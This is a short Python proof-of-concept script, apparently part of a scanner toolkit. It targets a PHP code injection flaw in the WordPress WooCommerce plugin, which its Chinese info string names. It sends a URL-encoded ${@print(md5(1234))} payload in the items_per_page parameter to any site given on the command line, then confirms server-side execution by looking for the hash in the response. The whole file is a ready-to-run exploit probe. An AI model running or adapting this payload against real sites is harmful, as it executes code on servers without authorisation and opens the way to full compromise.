#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/produits/?items_per_page=%24%7b%40print(Result+md5(1234))%7d&setListingType=grid"
bug ="81dc9bdb52d04dc20036dbd8313ed055"
info ="存在wordpress 插件WooCommerce PHP代码注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
